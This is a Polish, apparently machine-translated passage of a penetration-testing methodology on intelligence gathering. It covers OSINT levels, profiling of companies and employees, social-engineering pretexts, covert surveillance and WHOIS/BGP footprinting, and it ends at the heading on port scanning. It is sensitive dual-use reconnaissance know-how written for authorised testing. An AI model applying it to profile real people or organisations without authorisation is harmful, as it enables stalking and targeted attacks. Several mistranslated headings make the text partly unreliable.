+Nie obejmuje nurkowania w śmietnikach ani żadnych metod odzyskiwania informacji o firmie z fizycznych przedmiotów znalezionych na terenie firmy.
+
+Wybór celu
+Identyfikacja i nazewnictwo celu
+Zbliżając się do organizacji docelowej, ważne jest, aby zrozumieć, że firma może mieć wiele różnych domen najwyższego poziomu (TDL) i firm pomocniczych. Chociaż informacje te powinny były zostać odkryte na etapie ustalania zakresu, nie jest niczym niezwykłym zidentyfikowanie dodatkowych domen serwerów i firm, które mogły nie być częścią początkowego zakresu omówionego na etapie wstępnego zaangażowania. Na przykład firma może mieć TDL .com. Mogą jednak mieć również domeny .net .co i .xxx. Mogą one wymagać uwzględnienia w zmienionym zakresie lub mogą być niedostępne. Tak czy inaczej, należy to uzgodnić z klientem przed rozpoczęciem testowania. Nie jest też niczym niezwykłym, że firma ma pod sobą kilka spółek podrzędnych. Na przykład General Electric i Proctor and Gamble są właścicielami wielu mniejszych firm.
+
+Weź pod uwagę wszelkie ograniczenia Zasad zaangażowania
+W tym momencie warto zapoznać się z Zasadami Zaangażowania. Często zapomina się o nich podczas testu. Czasami jako testerzy jesteśmy tak pochłonięci tym, co znajdujemy i możliwościami ataku, że zapominamy, które adresy IP, domeny i sieci możemy zaatakować. Zawsze odwołuj się do Zasad zaangażowania, aby zachować koncentrację na testach. Jest to ważne nie tylko z perspektywy prawnej, ale także z punktu widzenia pełzania zakresu. Za każdym razem, gdy odchodzisz od głównych celów testu, tracisz czas. A na dłuższą metę może to kosztować Twoją firmę pieniądze.
+
+Rozważ czas trwania testu
+Ilość czasu przeznaczonego na cały test będzie miała bezpośredni wpływ na ilość zbierania danych wywiadowczych, które można wykonać. Istnieją testy, w których całkowity czas wynosi od dwóch do trzech miesięcy. Podczas tych zadań firma testująca spędzałaby ogromną ilość czasu na analizowaniu każdej z podstawowych jednostek biznesowych i personelu firmy. Jednak w przypadku krótszych testów w stylu kryształowego pudełka cele mogą być znacznie bardziej taktyczne. Na przykład testowanie określonej aplikacji internetowej może nie wymagać badania dokumentacji finansowej dyrektora generalnego firmy.
+
+Rozważ cel końcowy testu
+Każdy test ma na uwadze cel końcowy — konkretny zasób lub proces, który organizacja uważa za krytyczny. Mając na uwadze wynik końcowy, faza zbierania informacji powinna uwzględniać wszystkie drugorzędne i trzeciorzędne elementy otaczające cel końcowy. Niezależnie od tego, czy są to technologie wspierające, osoby trzecie, odpowiedni personel itp. Upewnienie się, że skupiono się na krytycznych zasobach, zapewnia, że ​​mniej istotne elementy wywiadowcze są usuwane z priorytetów i kategoryzowane jako takie, aby nie ingerować w proces analizy.
+
+OSINT
+Open Source Intelligence (OSINT) przybiera trzy formy; Pasywne, półpasywne i aktywne.
+
+Pasywne zbieranie informacji : Pasywne zbieranie informacji jest ogólnie przydatne tylko wtedy, gdy istnieje bardzo wyraźny wymóg, aby działania związane z gromadzeniem informacji nigdy nie zostały wykryte przez cel. Ten rodzaj profilowania jest technicznie trudny do wykonania, ponieważ nigdy nie wysyłamy żadnego ruchu do organizacji docelowej ani z jednego z naszych hostów, ani z „anonimowych” hostów lub usług w Internecie. Oznacza to, że możemy wykorzystywać i gromadzić tylko zarchiwizowane lub przechowywane informacje. W związku z tym informacje te mogą być nieaktualne lub nieprawidłowe, ponieważ jesteśmy ograniczeni do wyników zebranych od osób trzecich.
+
+Półpasywne zbieranie informacji : Celem półpasywnego zbierania informacji jest profilowanie celu za pomocą metod, które wyglądają jak normalny ruch i zachowanie w Internecie. Odpytujemy tylko opublikowane serwery nazw w celu uzyskania informacji, nie przeprowadzamy dogłębnych wyszukiwań wstecznych ani żądań DNS typu brute force, nie szukamy „nieopublikowanych” serwerów ani katalogów. Nie przeprowadzamy skanowania portów ani robotów indeksujących na poziomie sieci i patrzymy tylko na metadane w opublikowanych dokumentach i plikach; nie poszukują aktywnie ukrytych treści. Kluczem jest tu nie zwracanie uwagi na nasze działania. Post mortem cel może być w stanie cofnąć się i odkryć działania zwiadowcze, ale nie powinien być w stanie nikomu ich przypisać.
+
+Aktywne zbieranie informacji : Aktywne zbieranie informacji powinno zostać wykryte przez cel i podejrzane lub złośliwe zachowanie. Na tym etapie aktywnie mapujemy infrastrukturę sieciową (pomyśl o pełnym skanowaniu portów nmap –p1-65535), aktywnie wyliczamy i/lub skanujemy otwarte usługi pod kątem luk w zabezpieczeniach, aktywnie szukamy nieopublikowanych katalogów, plików i serwerów. Większość z tych działań mieści się w typowych czynnościach „rozpoznawczych” lub „skanujących” pod kątem standardowego pentestu.
+
+Zbiorowy
+Fizyczny
+Lokalizacje (L1)
+W podziale na lokalizację wykaz pełnych adresów, własności, powiązanych dokumentów (miasto, podatki, prawne itp.), pełny wykaz wszystkich fizycznych środków bezpieczeństwa w danej lokalizacji (umiejscowienie kamer, czujniki, ogrodzenia, posterunki strażnicze, kontrola wejść, bramy, rodzaj identyfikacji , wejście dostawcy, fizyczne lokalizacje oparte na blokach IP/usługach geolokalizacyjnych itp. Dla Hostów/NOC: Pełna notacja CIDR hostów i sieci, pełna lista DNS wszystkich powiązanych zasobów, Pełne mapowanie AS, ścieżki peeringu, udostępnianie CDN, właściciele bloków sieciowych (dane whois), rekordy e-mail (MX + struktura adresu e-mail)
+
+Właściciel (L1/L2)
+Ewidencja gruntów/podatków (L1/L2)
+Wspólne/indywidualne (L1/L2)
+Strefy czasowe (L1/L2)
+Gospodarze / NOC
+Wszechobecność (L1)
+Nierzadko organizacja docelowa ma wiele oddzielnych lokalizacji fizycznych. Na przykład bank będzie miał biura centralne, ale będzie miał również wiele zdalnych oddziałów. Podczas gdy bezpieczeństwo fizyczne i techniczne może być bardzo dobre w centralnych lokalizacjach, odległe lokalizacje często mają słabe kontrole bezpieczeństwa.
+
+Relacje (L1)
+Partnerzy biznesowi, służby celne, dostawcy, analizy za pośrednictwem tego, co jest otwarcie udostępniane na korporacyjnych stronach internetowych, w wypożyczalniach itp. Informacje te można wykorzystać do lepszego zrozumienia projektów biznesowych lub organizacyjnych. Na przykład, jakie produkty i usługi są krytyczne dla organizacji docelowej?
+
+Informacje te można również wykorzystać do stworzenia udanych scenariuszy socjotechnicznych.
+
+Relacje (L2/L3)
+Ręczna analiza w celu sprawdzenia informacji z poziomu 1 oraz zagłębienia się w możliwe relacje.
+Współdzielona przestrzeń biurowa (L2/L3)
+Infrastruktura współdzielona (L2/L3)
+Wypożyczony/leasingowany sprzęt (L2/L3)
+Logiczny
+Zgromadzone informacje dla partnerów, klientów i konkurentów: dla każdego z nich pełna lista nazwy firmy, adresu firmy, rodzaju relacji, podstawowych informacji finansowych, podstawowych informacji o hostach/sieci.
+
+Partnerzy Biznesowi (L1/L2/L3)
+Reklamowani partnerzy biznesowi celu. Czasami reklamowane na głównej stronie www.
+Klienci biznesowi (L1/L2/L3)
+Reklamowani klienci biznesowi celu. Czasami reklamowane na głównej stronie www.
+Zawodnicy (L1/L2/L3)
+Kim są konkurenci celu. Może to być proste, Ford vs Chevy, lub może wymagać znacznie więcej analiz.
+Wykres dotykowy (L1)
+Touchgraph (wizualna reprezentacja społecznych powiązań między ludźmi) pomoże nakreślić możliwe interakcje między ludźmi w organizacji i jak uzyskać do nich dostęp z zewnątrz (kiedy touchgraph obejmuje społeczności zewnętrzne i jest tworzony z poziomem głębi powyżej 2).
+Podstawowy wykres dotykowy powinien odzwierciedlać strukturę organizacyjną wynikającą z dotychczas zebranych informacji i na jego podstawie powinna opierać się dalsza rozbudowa wykresu (ponieważ zwykle lepiej odzwierciedla on koncentrację na aktywach organizacji i wyjaśnia możliwe wektory podejścia.
+Profil odkurzacza (L1/L2)
+Co: półotwarty zasób wywiadowczy (zwykle płatne subskrypcje). Takie źródła specjalizują się w gromadzeniu informacji biznesowych o firmach i dostarczaniu „znormalizowanego” spojrzenia na biznes.
+Dlaczego: Informacje obejmują fizyczne lokalizacje, otoczenie konkurencyjne, kluczowy personel, informacje finansowe i inne dane związane z działalnością (w zależności od źródła). Można to wykorzystać do stworzenia dokładniejszego profilu celu i zidentyfikowania dodatkowego personelu i osób trzecich, które można wykorzystać w teście.
+Jak: Proste wyszukiwanie na stronie z nazwą firmy zapewnia pełny profil firmy i wszystkie informacje, które są na niej dostępne. Zaleca się korzystanie z kilku źródeł w celu ich wzajemnego odniesienia i upewnienia się, że otrzymujesz najbardziej aktualne informacje. (płatny za usługę).
+Linia produktów (L2/L3)
+Oferta produktowa celu, która może wymagać dodatkowej analizy, jeśli cel oferuje również usługi, może wymagać dalszej analizy.
+Pionowy rynek (L1)
+W jakiej branży rezyduje cel, tj. finansowa, obronna, rolnicza, rządowa itp
+Konta marketingowe (L2/L3)
+Działania marketingowe mogą dostarczyć wielu informacji na temat strategii marketingowej celu
+Oceń wszystkie sieci mediów społecznościowych pod kątem profili społecznościowych celu
+Oceń przeszłe * kampanie marketingowe celu
+Spotkania (L2/L3)
+Opublikowano protokół ze spotkania?
+Spotkania otwarte dla publiczności?
+Znaczące daty firmy (L1/L2/L3)
+Spotkanie zarządu
+Wakacje
+rocznice
+Uruchomienie produktu/usługi
+Oferty pracy (L1/L2)
+Przeglądając listę ofert pracy w organizacji (zwykle znajdującą się w sekcji „kariera” na ich stronie internetowej), możesz określić rodzaje technologii używanych w organizacji. Jednym z przykładów może być sytuacja, w której organizacja ma ofertę pracy dla starszego administratora systemu Solaris, wtedy jest całkiem oczywiste, że organizacja korzysta z systemów Solaris. Inne stanowiska mogą nie być tak oczywiste na podstawie nazwy stanowiska, ale otwarte stanowisko młodszego administratora sieci może sugerować, że „preferowane CCNA” lub „preferowane JNCIA”, co oznacza, że ​​korzystają z technologii Cisco lub Juniper.
+Przynależność do organizacji charytatywnych (L1/L2/L3)
+Bardzo często zdarza się, że członkowie kierownictwa docelowej organizacji są związani z organizacjami charytatywnymi. Informacje te można wykorzystać do opracowania solidnych scenariuszy inżynierii społecznej dla kadry kierowniczej.
+Zapytanie ofertowe, zapytanie ofertowe i inne informacje o przetargach publicznych (L1/L2)
+Zapytania ofertowe i zapytania ofertowe często ujawniają wiele informacji o typach systemów używanych przez firmę, a potencjalnie nawet o lukach lub problemach z jej infrastrukturą.
+Dowiedzenie się, kim są obecni zwycięzcy przetargów, może ujawnić typy używanych systemów lub lokalizację, w której zasoby firmy mogą być hostowane poza siedzibą firmy.
+Akta sądowe (L2/L3)
+Akta sądowe są zwykle dostępne bezpłatnie lub czasami za opłatą.
+Treść postępowania sądowego może ujawnić informacje o wcześniejszych osobach składających skargę, w tym między innymi o pozwach byłych pracowników
+Rejestry karne obecnych i byłych pracowników mogą zawierać listę celów dla działań socjotechnicznych
+Darowizny polityczne (L2/L3)
+Mapowanie darowizn politycznych lub innych interesów finansowych jest ważne w celu zidentyfikowania kluczowych osób, które mogą nie zajmować oczywistych stanowisk władzy, ale mają własny interes (lub jest nim zainteresowany).
+Mapowanie darowizn na cele polityczne będzie się różnić w zależności od kraju w zależności od wolności informacji, ale często przypadki darowizn z innych krajów można prześledzić wstecz, korzystając z dostępnych tam danych.
+Licencje lub rejestry zawodowe (L2/L3)
+Zebranie listy docelowych licencji zawodowych i rejestrów może dać wgląd nie tylko w to, jak firma działała, ale także w wytyczne i przepisy, których przestrzegają, aby utrzymać te licencje. Doskonałym tego przykładem jest certyfikacja standardu ISO firmy, która może wykazać, że firma przestrzega ustalonych wytycznych i procesów. Ważne jest, aby tester był świadomy tych procesów i tego, jak mogą one wpłynąć na testy przeprowadzane w organizacji.
+Firma często umieszcza te informacje na swojej stronie internetowej jako odznakę honorową. W innych przypadkach może być konieczne przeszukanie rejestrów dla danej branży w celu sprawdzenia, czy organizacja jest członkiem. Dostępne informacje są bardzo zależne od rynku pionowego, a także położenia geograficznego firmy. Należy również zauważyć, że firmy międzynarodowe mogą mieć różne licencje i być zobowiązane do rejestracji w różnych standardach lub organach prawnych w zależności od kraju.
+Schemat organizacyjny (L1)
+Identyfikacja pozycji
+Ważne osoby w organizacji
+Osoby do konkretnego celu
+Transakcje
+Mapowanie zmian w organizacji (awansy, ruchy boczne)
+Partnerzy
+Mapowanie organizacji stowarzyszonych, które są powiązane z biznesem
+
+Elektroniczny
+Metadane dokumentu (L1/L2)
+Co to jest? Metadane lub metatreść dostarczają informacji o danych/dokumencie w zakresie. Może zawierać informacje, takie jak nazwisko autora/twórcy, czas i data, używane/odwołane standardy, lokalizacja w sieci komputerowej (informacje o drukarce/folderze/katalogu/itp.), znaczniki geograficzne itp. W przypadku obrazu jego metadane mogą zawierają kolor, głębię, rozdzielczość, markę/typ aparatu, a nawet współrzędne i informacje o lokalizacji.
+Dlaczego miałbyś to zrobić? Metadane są ważne, ponieważ zawierają informacje o sieci wewnętrznej, nazwach użytkowników, adresach e-mail, lokalizacjach drukarek itp. i pomogą w stworzeniu planu lokalizacji. Zawiera również informacje o oprogramowaniu użytym do tworzenia poszczególnych dokumentów. Może to umożliwić atakującemu utworzenie profilu i/lub przeprowadzenie ukierunkowanych ataków z wewnętrzną wiedzą na temat sieci i użytkowników.
+Jak byś to zrobił? Dostępne są narzędzia do wyodrębniania metadanych z pliku (pdf/word/image), takie jak FOCA (oparte na GUI), metagoofil (oparte na Pythonie), meta-extractor, exiftool (oparte na Perlu). Narzędzia te są w stanie wyodrębnić i wyświetlić wyniki w różnych formatach, takich jak HTML, XML, GUI, JSON itp. Dane wejściowe do tych narzędzi to głównie dokument pobrany z publicznej obecności „klienta”, a następnie przeanalizowany, aby dowiedzieć się więcej na jego temat . Podczas gdy FOCA pomaga wyszukiwać dokumenty, pobierać je i analizować za pośrednictwem interfejsu GUI.
+Komunikacja marketingowa (L1/L2)
+Przeszłe kampanie marketingowe dostarczają informacji o projektach, które mogły zostać wycofane i które mogą być nadal dostępne.
+Obecna komunikacja marketingowa zawiera elementy projektu (kolory, czcionki, grafikę itp.), które w większości są również wykorzystywane wewnętrznie.
+Dodatkowe informacje kontaktowe, w tym zewnętrzne organizacje marketingowe.
+Zasoby infrastrukturalne
+Posiadane bloki sieciowe (L1)
+Bloki sieciowe należące do organizacji można uzyskać pasywnie, przeprowadzając wyszukiwania whois. DNSStuff.com to punkt kompleksowej obsługi umożliwiający uzyskiwanie tego typu informacji.
+Wyszukiwanie adresów IP w otwartym kodzie źródłowym może dostarczyć informacji o typach infrastruktury w miejscu docelowym. Administratorzy często publikują informacje o adresie IP w kontekście próśb o pomoc w różnych witrynach pomocy technicznej.
+Adresy e-mail (L1)
+Adresy e-mail zapewniają potencjalną listę prawidłowych nazw użytkowników i struktury domen
+Adresy e-mail można zbierać z wielu źródeł, w tym ze stron internetowych organizacji.
+Profil infrastruktury zewnętrznej (L1)
+Profil infrastruktury zewnętrznej celu może dostarczyć ogromnej ilości informacji na temat technologii wykorzystywanych wewnętrznie.
+Informacje te można zbierać z wielu źródeł, zarówno pasywnie, jak i aktywnie.
+Profil powinien być wykorzystany przy konstruowaniu scenariusza ataku na infrastrukturę zewnętrzną.
+Zastosowane technologie (L1/L2)
+OSINT przeszukuje fora wsparcia, listy mailingowe i inne zasoby, które mogą gromadzić informacje o technologiach wykorzystywanych przez cel
+Wykorzystanie inżynierii społecznej przeciwko zidentyfikowanej organizacji informatycznej
+Stosowanie inżynierii społecznej przeciwko sprzedawcom produktów
+Umowy zakupu (L1/L2/L3)
+Umowy kupna zawierają informacje o sprzęcie, oprogramowaniu, licencjach i dodatkowych środkach trwałych znajdujących się w miejscu docelowym.
+Zdalny dostęp (L1/L2)
+Uzyskanie informacji o tym, jak pracownicy i/lub klienci łączą się z celem dostępu zdalnego, stanowi potencjalny punkt wejścia.
+Często link do portalu zdalnego dostępu jest dostępny poza stroną główną celu
+Dokumenty How To ujawniają aplikacje/procedury umożliwiające nawiązywanie połączeń dla użytkowników zdalnych
+Użycie aplikacji (L1/L2)
+Zbierz listę znanych aplikacji używanych przez organizację docelową. Często można to osiągnąć, wyodrębniając metadane z publicznie dostępnych plików (jak omówiono wcześniej)
+
+Technologie obronne (L1/L2/L3)
+Używane technologie obronne polegające na pobieraniu odcisków palców można osiągnąć na wiele sposobów, w zależności od stosowanych zabezpieczeń.
+
+Pasywne pobieranie odcisków palców
+Przeszukaj fora i publicznie dostępne informacje, na których technicy docelowej organizacji mogą omawiać problemy lub prosić o pomoc w zakresie używanej technologii
+Wyszukiwanie informacji marketingowych dla docelowej organizacji oraz popularnych dostawców technologii
+Za pomocą Tin-eye (lub innego narzędzia do dopasowywania obrazów) wyszukaj logo docelowej organizacji, aby zobaczyć, czy jest ono wymienione na stronach referencyjnych dostawców lub w materiałach marketingowych
+Aktywne pobieranie odcisków palców
+Wyślij odpowiednie pakiety próbne do systemów publicznych, aby przetestować wzorce blokowania. Istnieje kilka narzędzi do pobierania odcisków palców określonych typów WAF.
+Informacje nagłówkowe zarówno w odpowiedziach z docelowej strony internetowej, jak i w wiadomościach e-mail często zawierają informacje nie tylko o używanych systemach, ale także o włączonych konkretnych mechanizmach ochronnych (np. skanery antywirusowe bramy pocztowej)
+Zdolność człowieka (L1/L2/L3)
+Odkrywanie ludzkich zdolności obronnych docelowej organizacji może być trudne. Istnieje kilka kluczowych informacji, które mogą pomóc w ocenie bezpieczeństwa docelowej organizacji.
+
+Sprawdź obecność ogólnofirmowego zespołu CERT/CSIRT/PSRT
+Sprawdź ogłoszenia o pracę, aby zobaczyć, jak często wymienione jest stanowisko bezpieczeństwa
+Sprawdź ogłoszenia o pracę, aby zobaczyć, czy bezpieczeństwo jest wymienione jako wymóg dla zadań niezwiązanych z bezpieczeństwem (np. programiści)
+Sprawdź umowy outsourcingu, aby zobaczyć, czy bezpieczeństwo celu zostało zlecone częściowo lub w całości
+Sprawdź, czy konkretne osoby pracujące dla firmy mogą być aktywne w społeczności zajmującej się bezpieczeństwem
+Budżetowy
+Raportowanie (L1/L2)
+Docelowa sprawozdawczość finansowa będzie w dużym stopniu zależała od lokalizacji organizacji. Raportowanie może być również dokonywane za pośrednictwem centrali organizacji, a nie dla każdego oddziału. W 2008 roku SEC wydała propozycję planu działania dotyczącego przyjęcia Międzynarodowych Standardów Sprawozdawczości Finansowej (MSSF) w USA.
+
+Przyjęcie MSSF według kraju --> http://www.iasplus.com/en/resources/use-of-ifrs
+
+Analiza rynku (L1/L2/L3)
+Uzyskaj raporty z analizy rynku od organizacji analitycznych (takich jak Gartner, IDC, Forrester, 541 itp.). Powinno to obejmować definicję rynku, kapitalizację rynkową, konkurentów oraz wszelkie istotne zmiany w wycenie, produkcie lub firmie w ogóle.
+Kapitał handlowy
+Zidentyfikuj, czy organizacja przeznacza jakikolwiek kapitał handlowy i jaki procent ogólnej wyceny i wolnego kapitału posiada. Wskaże to, jak wrażliwa jest organizacja na wahania rynkowe i czy jest uzależniona od inwestycji zewnętrznych w ramach swojej wyceny i przepływów pieniężnych.
+Historia wartości
+Wykres wyceny organizacji w czasie, w celu ustalenia korelacji między zdarzeniami zewnętrznymi i wewnętrznymi oraz ich wpływu na wycenę.
+EDGAR (SEC)
+Co to jest: EDGAR (system elektronicznego gromadzenia, analizy i wyszukiwania danych) to baza danych amerykańskiej Komisji ds. Bezpieczeństwa i Giełd (SEC), która zawiera oświadczenia rejestracyjne, raporty okresowe i inne informacje dotyczące wszystkich firm (zarówno zagranicznych, jak i krajowych) którzy są prawnie zobowiązani do złożenia.
+Dlaczego to zrobić: Dane EDGAR są ważne, ponieważ oprócz informacji finansowych identyfikują kluczowy personel w firmie, który w inny sposób może nie być widoczny na stronie internetowej firmy lub w innej publicznej obecności. Zawiera również oświadczenia o wynagrodzeniach kadry zarządzającej, nazwiska i adresy głównych właścicieli akcji zwykłych, podsumowanie postępowań sądowych przeciwko spółce, czynniki ryzyka ekonomicznego i inne potencjalnie interesujące dane.
+Jak uzyskać: Informacje są dostępne na stronie internetowej SEC EDGAR ( http://www.sec.gov/edgar.shtml ). Szczególnie interesujące są raporty 10-K (raport roczny) i 10-Q (raport kwartalny).
+Indywidualny
+Pracownik
+Historia
+Akta sądowe (L2/L3)
+Co to jest: Akta sądowe to wszystkie rejestry publiczne związane ze skargami karnymi i/lub cywilnymi, pozwami sądowymi lub innymi działaniami prawnymi na rzecz lub przeciwko osobie lub organizacji będącej przedmiotem zainteresowania.
+Dlaczego miałbyś to zrobić: Akta sądowe mogą potencjalnie ujawnić poufne informacje dotyczące pojedynczego pracownika lub całej firmy. Te informacje mogą być przydatne same w sobie lub mogą być motorem do uzyskania dodatkowych informacji. Można go również wykorzystać do inżynierii społecznej lub do innych celów później w teście penetracyjnym.
+Jak byś to zrobił: Wiele z tych informacji jest obecnie dostępnych w Internecie za pośrednictwem publicznie dostępnych stron internetowych sądów i baz danych akt. Niektóre dodatkowe informacje mogą być dostępne za pośrednictwem płatnych usług, takich jak LEXIS/NEXIS. Niektóre informacje mogą być dostępne na prośbę o rejestrację lub osobiście.
+Darowizny polityczne (L2/L3)
+Co to jest: darowizny na cele polityczne to osobiste fundusze danej osoby kierowane do określonych kandydatów politycznych, partii politycznych lub organizacji o specjalnym interesie.
+Dlaczego miałbyś to robić: informacje o darowiznach na cele polityczne mogą potencjalnie ujawnić przydatne informacje dotyczące danej osoby. Informacje te można wykorzystać jako część analizy sieci społecznościowych, aby pomóc w nawiązaniu powiązań między osobami a politykami, kandydatami politycznymi lub innymi organizacjami politycznymi. Można go również wykorzystać do inżynierii społecznej lub do innych celów później w teście penetracyjnym.
+Jak byś to zrobił: Wiele z tych informacji jest obecnie dostępnych w Internecie za pośrednictwem publicznie dostępnych stron internetowych (np. http://www.opensecrets.org/ ), które śledzą indywidualne darowizny na cele polityczne. W zależności od prawa danego stanu, darowizny powyżej określonej kwoty zwykle muszą być rejestrowane.
+Licencje lub rejestry zawodowe (L2/L3)
+Co to jest: licencje lub rejestry zawodowe to repozytoria informacji zawierające listy członków i inne powiązane informacje dotyczące osób, które uzyskały określoną licencję lub pewien stopień przynależności do społeczności.
+Dlaczego miałbyś to zrobić: informacje o licencjach zawodowych mogą potencjalnie ujawnić przydatne informacje dotyczące danej osoby. Informacje te mogą być wykorzystane do sprawdzenia wiarygodności danej osoby (czy rzeczywiście posiadają określony certyfikat, jak twierdzą) lub jako część analizy sieci społecznościowych, aby pomóc w nawiązaniu powiązań między osobami a innymi organizacjami. Można go również wykorzystać do inżynierii społecznej lub do innych celów później w teście penetracyjnym.
+Jak byś to zrobił: Wiele z tych informacji jest obecnie dostępnych w Internecie za pośrednictwem publicznie dostępnych stron internetowych. Zazwyczaj każda organizacja prowadzi własny rejestr informacji, które mogą być dostępne online lub których zebranie może wymagać dodatkowych czynności.
+Profil sieci społecznościowej (SocNet).
+Wyciek metadanych (L2/L3)
+Świadomość lokalizacji za pomocą metadanych zdjęć
+Ton (L2/L3)
+Oczekiwany rezultat: subiektywna identyfikacja tonu używanego w komunikacji – agresywny, pasywny, atrakcyjny, sprzedażowy, chwalący, dyskredytujący, protekcjonalny, arogancki, elitarny, słabszy, przywódca, naśladowca, naśladownictwo itp.
+Częstotliwość (L2/L3)
+Oczekiwany rezultat: Określenie częstotliwości publikacji (raz na godzinę/dzień/tydzień itd.). Dodatkowo - pora dnia/tygodnia, w której najczęściej dochodzi do komunikacji.
+Świadomość lokalizacji (L2/L3)
+Historia lokalizacji na mapie dla profilowanej osoby z różnych źródeł, czy to poprzez bezpośrednią interakcję z aplikacjami i sieciami społecznościowymi, czy poprzez bierne uczestnictwo poprzez metadane zdjęć.
+Aplikacje mapy Bing
+czworokąt
+Współrzędne Google
+Skowyt
+Gowalla
+Obecność w mediach społecznościowych (L1/L2/L3)
+Zweryfikuj konto/obecność celu w mediach społecznościowych (L1). I przedstaw szczegółową analizę (L2/L3)
+Obecność w Internecie
+Adres e-mail (L1)
+Co to jest? Adresy e-mail to identyfikatory publicznych skrzynek pocztowych użytkowników.
+Dlaczego miałbyś to zrobić? Zbieranie lub wyszukiwanie adresów e-mail jest ważne, ponieważ służy wielu celom - zapewnia prawdopodobny format identyfikatora użytkownika, który można później brutalnie wymusić w celu uzyskania dostępu, ale co ważniejsze, pomaga w wysyłaniu ukierunkowanego spamu, a nawet do zautomatyzowanych botów. Te wiadomości spamowe mogą zawierać exploity, złośliwe oprogramowanie itp. i mogą być adresowane z określoną treścią, szczególnie do użytkownika.
+Jak byś to zrobił? Adresy e-mail można wyszukiwać i wyodrębniać z różnych stron internetowych, grup, blogów, forów, portali społecznościowych itp. Te adresy e-mail są również dostępne na różnych stronach pomocy technicznej. Istnieją narzędzia zbierające i pająki do wyszukiwania adresów e-mail mapowanych na określoną domenę (w razie potrzeby).
+Osobiste uchwyty/pseudonimy (L1)
+Zarejestrowane nazwy domen osobistych (L1/L2)
+Przypisane statyczne adresy IP/bloki sieciowe (L1/L2)
+Lokalizacja fizyczna
+Lokalizacja fizyczna
+Czy możesz ustalić fizyczną lokalizację celu
+Ślad mobilny
+Numer telefonu (L1/L2/L3)
+Typ urządzenia (L1/L2/L3)
+Użyj (L1/L2/L3)
+Zainstalowane aplikacje (L1/L2/L3)
+Właściciel/administrator (L1/L2/L3)
+
+Informacje „za opłatą”.
+Kontrole w tle
+Za Pay Linked-In
+LEXIS/NEXIS
+Tajne zgromadzenie
+Zbiorowy
+Spotkanie na miejscu
+Wybieranie konkretnych lokalizacji do zbierania na miejscu, a następnie przeprowadzanie rekonesansu w czasie (zwykle co najmniej 2-3 dni w celu zapewnienia wzorców). Podczas zbierania danych wywiadowczych na miejscu poszukiwane są następujące elementy:
+
+Inspekcje bezpieczeństwa fizycznego
+Skanowanie bezprzewodowe / skanowanie częstotliwości RF
+Inspekcja szkoleń z zachowania pracowników
+Obiekty dostępne/sąsiadujące (powierzchnie wspólne)
+Nurkowanie w śmietniku
+Rodzaje używanego sprzętu
+Spotkanie poza siedzibą firmy
+Identyfikacja lokalizacji poza siedzibą firmy i ich znaczenie/powiązanie z organizacją. Są to zarówno logiczne, jak i fizyczne lokalizacje, zgodnie z poniższym:
+
+Lokalizacje centrów danych
+Udostępnianie/dostawca sieci
+HUMINT
+Inteligencja ludzka uzupełnia bardziej pasywne gromadzenie zasobów, ponieważ dostarcza informacji, których nie można by uzyskać w inny sposób, a także dodaje więcej „osobistych” perspektyw do obrazu wywiadowczego (uczucia, historia, relacje między kluczowymi osobami, „atmosfera” itp. ...)
+
+Metodologia pozyskiwania ludzkiej inteligencji zawsze wiąże się z bezpośrednią interakcją – czy to fizyczną, czy werbalną. Gromadzenie powinno odbywać się pod przybraną tożsamością, która zostałaby stworzona specjalnie w celu uzyskania optymalnej ekspozycji informacji i współpracy z danego zasobu.
+
+Dodatkowo, zbieranie danych wywiadowczych na bardziej wrażliwych celach może odbywać się wyłącznie poprzez obserwację – ponownie fizycznie na miejscu lub za pomocą środków elektronicznych/zdalnych (CCTV, kamery internetowe itp.). Zwykle robi się to w celu ustalenia wzorców zachowań (takich jak częstotliwość wizyt, zasady ubioru, ścieżki dostępu, kluczowe lokalizacje, które mogą zapewniać dodatkowy dostęp, takie jak kawiarnie).
+
+Wyniki
+Kluczowi pracownicy
+Partnerzy/Dostawcy
+Inżynieria społeczna
+Odcisk stopy
+CO TO JEST: Zewnętrzne gromadzenie informacji, znane również jako footprinting, to faza gromadzenia informacji, która polega na interakcji z celem w celu uzyskania informacji z perspektywy zewnętrznej w stosunku do organizacji.
+
+DLACZEGO: Wiele informacji można zebrać poprzez interakcję z celami. Sondując usługę lub urządzenie, często można stworzyć scenariusze, w których można pobrać odcisk palca lub jeszcze prościej, można uzyskać baner, który zidentyfikuje urządzenie. Ten krok jest niezbędny, aby zebrać więcej informacji o celach. Twoim celem, po tej sekcji, jest uszeregowana pod względem ważności lista celów.
+
+Ślad zewnętrzny
+Zidentyfikuj zewnętrzne zakresy klientów
+Jednym z głównych celów zbierania danych wywiadowczych podczas testu penetracyjnego jest określenie hostów, które będą objęte zakresem. Istnieje wiele technik, które można wykorzystać do identyfikacji systemów, w tym odwrotne wyszukiwanie DNS, bruting DNS, wyszukiwanie WHOIS w domenach i zakresach. Te i inne techniki są udokumentowane poniżej.
+
+Rekonesans pasywny
+Wyszukiwania WHOIS
+W przypadku śledzenia zewnętrznego najpierw musimy ustalić, który z serwerów WHOIS zawiera informacje, których szukamy. Biorąc pod uwagę, że powinniśmy znać TLD domeny docelowej, musimy po prostu zlokalizować rejestratora, u którego zarejestrowana jest domena docelowa.
+
+Informacje WHOIS są oparte na hierarchii drzewa. ICANN (IANA) jest autorytatywnym rejestrem dla wszystkich domen TLD i jest doskonałym punktem wyjścia dla wszystkich ręcznych zapytań WHOIS.
+
+ICANN – http://www.icann.org
+IANA - http://www.iana.com
+NRO - http://www.nro.net
+AFRINIC - http://www.afrinic.net
+APNIC - http://www.apnic.net
+ARIN - http://ws.arin.net
+LACNIC - http://www.lacnic.net
+RIPE - http://www.ripe.net
+Po zapytaniu odpowiedniego rejestratora możemy uzyskać informacje o rejestrującym. Istnieje wiele witryn oferujących informacje WHOIS; jednak w celu zapewnienia dokładności dokumentacji należy korzystać tylko z odpowiedniego rejestratora.
+
+InterNIC - http://www.internic.net/ http://www.internic.net ]
+Zazwyczaj prosty whois przeciwko ARIN skieruje Cię do właściwego rejestratora.
+
+Okulary BGP
+Możliwe jest zidentyfikowanie numeru systemu autonomicznego (ASN) dla sieci uczestniczących w protokole Border Gateway Protocol (BGP). Ponieważ ścieżki tras BGP są reklamowane na całym świecie, możemy je znaleźć za pomocą zwierciadła BGP4 i BGP6.
+
+BGP4 - http://www.bgp4.as/ Looking-glasses
+BPG6 - http://lg.he.net/
+Aktywny ślad
+Skanowanie portów
